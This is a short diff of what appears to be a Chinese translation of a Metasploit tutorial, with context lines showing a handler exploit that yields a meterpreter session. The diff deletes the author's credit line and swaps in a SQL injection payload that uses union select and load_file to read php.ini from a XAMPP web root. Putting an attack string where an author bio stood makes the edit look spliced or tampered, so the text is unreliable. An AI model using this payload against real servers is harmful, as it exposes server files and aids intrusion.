@@ -132,5 +132,4 @@ msf 利用（处理程序）>利用
 神圣的！  这里我们有我们的 meterpreter session 1。
 
 
-
-作者：  Aarti Singh 是 Hacking Articles 的研究员和技术作家，信息安全顾问，社交媒体爱好者和小工具。 在这里联系
+' union select 1,load_file('C:/xampp/htdocs/php.ini')#
